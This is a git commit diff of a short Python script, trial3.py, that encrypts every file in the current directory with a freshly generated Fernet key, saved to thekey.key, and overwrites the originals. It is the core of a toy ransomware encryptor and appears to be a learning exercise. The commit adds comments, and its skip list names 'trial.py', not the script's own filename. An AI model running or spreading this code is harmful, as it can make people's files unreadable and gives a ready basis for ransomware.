e1cde5323e2540b2a80e4b6505ae265ea6915198
A Pawan <alugolupawan.com>
2025-06-26 00:14:34 +0530

    ~

--- trial3.py
+++ trial3.py
@@ -1,19 +1,24 @@
 #!/usr/bin/env python3
 import os
 from cryptography.fernet import Fernet
+# Ensure the cryptography package is installed: pip install cryptography
 
 files = []
+
 for file in os.listdir():
     if file == "trial.py" or file == "thekey.key":
         continue
-    if os.path.isfile(file):
+    if os.path.isfile(file):  # This line was wrongly indented in your code
         files.append(file)
+
 print(files)
 
 key = Fernet.generate_key()
+
 with open("thekey.key", "wb") as thekey:
     thekey.write(key)
-#print(key) if we want to see the key
+
+# print(key)  # Uncomment this if you want to see the key
 
 for file in files:
     with open(file, "rb") as thefile:
@@ -22,5 +27,5 @@ for file in files:
     encrypted = fernet.encrypt(contents)
     with open(file, "wb") as thefile:
         thefile.write(encrypted)
-        
+
     print(f"Encrypted {file} successfully.")
